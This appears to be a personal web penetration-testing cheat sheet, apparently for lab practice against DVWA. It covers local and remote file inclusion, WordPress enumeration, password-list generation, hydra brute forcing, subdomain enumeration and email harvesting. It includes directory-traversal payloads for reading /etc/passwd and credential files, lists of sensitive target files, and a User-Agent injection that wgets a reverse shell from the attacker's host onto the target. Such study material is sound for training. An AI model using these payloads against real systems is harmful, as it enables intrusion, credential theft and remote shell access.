# Web Application Penetration Testing

### Local File Inclusion

#### REading Files 

File Inclusion vulnerabilities are commonly found in poorly written PHP web-applications where the input parameters are not properly sanitized or validated

Local file inclusion is the vulnerability in which an attacker tries to trick the web-application by including the files that are already present locally into the server. It arises when a php file contains some php functions such as “include”, “include_once”, “require”, “require_once”.

https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/


tool: https://github.com/D35m0nd142/LFISuite
tool: https://github.com/P0cL4bs/kadimus


Example 

DVMA source:

```
$file = $_GET['page']
```
The page parameter is not sanitized, so we can use this to traver the directory structure:

```
# oringal request
http://<IP_ADDRESS>/dvma/vulnerabilites/fi?page=include.php

# if Ubuntu we are likely here in the file system
/var/www/dvwa/vulnerabilities/fi/
/var/www/html/dvwa/vulnerabilities/fi/
```
Add ../ to trevares the directory structure to navigate to sensitive files:
```
http://10.11.1.250/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd

# include  null byte at the end in order to terminate the string and not include an extra file extension
http://10.11.1.250/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd%00
```
Intersting files for LFI:

Linux

The following files can be found on Linux systems:

    /etc/passwd
    /etc/shadow
    /etc/issue
    /etc/group
    /etc/hostname

Log files

The following files are log files found on Linux systems:

    Apache access log: /var/log/apache/access.log
    Apache access log: /var/log/apache2/access.log
    Apache access log: /var/log/httpd/access_log
    Apache error log: /var/log/apache/error.log
    Apache error log: /var/log/apache2/error.log
    Apache error log: /var/log/httpd/error_log
    General messages and system related entries: /var/log/messages
    Cron logs: /var/log/cron.log
    Authentication logs: /var/log/secure or /var/log/auth.log

CMS configuration files

The following files are configuration files for popular content management systems. When a target is running any of these CMS systems you can try to include their configuration files as they often contain sensitive information, such as (root) credentials used to access the database.

    WordPress: /var/www/html/wp-config.php
    Joomla: /var/www/configuration.php
    Dolphin CMS: /var/www/html/inc/header.inc.php
    Drupal: /var/www/html/sites/default/settings.php
    Mambo: /var/www/configuration.php
    PHPNuke: /var/www/config.php
    PHPbb: /var/www/config.php
    
Windows

To verify LFI on Windows systems a very common file we can attempt to include is the hosts file in the following directory:

    C:/windows/System32/drivers/etc/hosts

The following files of interest can (sometimes) be found on Windows systems which may contain passwords and other sensitive information:

    C:/Windows/Panther/Unattend/Unattended.xml //may contain creds for privialeged accounts
    C:/Windows/Panther/Unattended.xml
    C:/Windows/Panther/Unattend.txt
    C:/Unattend.xml
    C:/Autounattend.xml
    C:/Windows/system32/sysprep
    
Another directory with potentially interesting files is the web root directory:

    C:/inetpub/wwwroot/
    C:/inetpub/wwwroot/web.config
    C:/inetpub/logs/logfiles/

The following files of interest can (sometimes) be found on Windows systems:

    C:/documents and settings/administrator/desktop/desktop.ini
    C:/documents and settings/administrator/ntuser.dat
    C:/documents and settings/administrator/ntuser.ini
    C:/users/administrator/desktop/desktop.ini
    C:/users/administrator/ntuser.dat
    C:/users/administrator/ntuser.ini
    C:/windows/windowsupdate.log

XAMPP

The following files are configuration and log files used by XAMPP on Windows:

    C:/xampp/apache/conf/httpd.conf
    C:/xampp/security/webdav.htpasswd
    C:/xampp/apache/logs/access.log
    C:/xampp/apache/logs/error.log
    C:/xampp/tomcat/conf/tomcat-users.xml
    C:/xampp/tomcat/conf/web.xml
    C:/xampp/webalizer/webalizer.conf
    C:/xampp/webdav/webdav.txt
    C:/xampp/apache/bin/php.ini
    C:/xampp/apache/conf/httpd.conf

### Obtaining a shell with LFI (Environ Method)

See if you can access environ:
```
http://10.11.1.250/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ
```

Now download the php reverseehll from pentest monkey and serve it up with a python http server (change ext to .txt

```
# change permisiongs
chmod 755 /var/www/html/revshell.txt

# start server 
python3 -m http.server 80
```
Now in burp with the request for environ, Replace the User-Agent with the following code that downloads the revshell.txt file from our machine and stores it as shell.php on the target system:
```
<?system('wget http://[IP attack box]/revshell.txt -O shell.php');?>
```
The revshell.txt file with the reverse shell code is now renamed to shell.php and stored in the same directory as the vulnerable page (the current working directory).

Set up a reverse shell, then send the following request to the webserver to execute the oayload:
```
http://10.11.1.250/dvwa/vulnerabilities/fi/shell.php

```

### Obtaining a shell with LFI (Metasploit Method)

Use the php_include module"
```
use exploit/unix/webapp/php_include

# set The URI to request where the vulnerable parameter is specified as XXpathXX.

```

### REmote File Inclusion

Remote File Inclusions (RFI) are very similar to LFI but affect files on remote servers instead of files on the local web server. Remote files can include malicious code that executes on the server in the context of the user running the web server or on any client devices that visit a compromised webpage.

Example include a file from your local webserver:

http://10.11.1.250/dvwa/vulnerabilities/fi/?page=http://172.16.1.4/exploit.txt

If you receive a warning saying that *URL file access is disabled in the server configuration in <PHP config file> you cannot include php file in the page parameter 
    
these must be enabled in the php.ini file:
    
   ```
    allow_url_fopen = On

allow_url_include = On
    ```
    
 the location of php.ini is in the phpinfo,oho file 
    
now rerun the url and should print out the contents of exploit.txt
    
    
### Wordpress enumeration 

nmap --script=/usr/share/nmap/scripts/http-wordpress-users.nse -sV -Pn -p 80 10.12.1.7

enum plugins
```
wpscan --url <IP> --enumerate p
 ```
enumerate vuln plugins
```
 wpscan --url <IP> --enumerate vp
 ```
 # use the api token so that yoou actually see vulnerabilites
 ```
wpscan --url http://10.12.1.192 --enumerate vp --api-token <API TOKEN>
```

### Brute Force web Login Pages

#### Generating password lists

Crunch is an easy to use tool for generating a custom password lists that can be used for brute forcing passwords  
```
crunch [min length] [max length] [charset] [options]

# 4 capital letters from the alphabet in all their possible combinations
crunch 4 4 ABCDEFGHIJKLMNOPQRSTUVWXYZ -o /root/Desktop/wordlist.txt

# passwords with all the possible combinations for 5 digits
crunch 5 5 0123456789 -o /root/Desktop/numbers.txt

# 4 capital letters in all possible combinations followed by the number 1980
crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ -t @@@@1980 -o /root/Desktop/wordlist.txt
```

Cewl examples:
```
# 8 letters or more and go 1 level deep
cewl -d 1 -m 8 -w /root/Desktop/cewl.txt https://www.kali.org
```
#### Burpsuite 

First ensure to capture the message displayed when an incorret login is entered, such as *Login Faild*

Now complete the following in Burpsuite

1. Capture an HTTP request
2. Send to Intruder
3

Bruteforce with hydra:
```
hydra 10.11.1.250 -t 2 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form “</PATH/TO/LOGIN_PAGE>:username=^USER^&password=^PASS^&Login=Login:<FAILED_LOGIN_MESSAGE>”
```

### Subdoamin enumerations

#### Subliste3r

```
# default scan
sublist3r -d <DOMAIN>

# brute force scan with addtional threads:
sublist3r -d google.com -b -t 100 -e <DOMAIN> -v
```


### Passive information Gathering Websites

https://www.google.com
https://www.google.com/maps
https://www.exploit-db.com/google-hacking-database/
https://www.shodan.io
https://www.tineye.com
https://www.netcraft.com
https://pastebin.com
https://haveibeenpwned.com

<br/>

### Email Harvesting

```
theHarvester -d <DOMAIN> -b <SEARCH ENGINE>
```

```
recon-ng

# costs money
marketplace install recon/contacts-credentials/hibp_breach

keys add hibp_api [API key]

modules load recon/contacts-credentials/hibp_breach

options set SOURCE <Target email address>
run
```


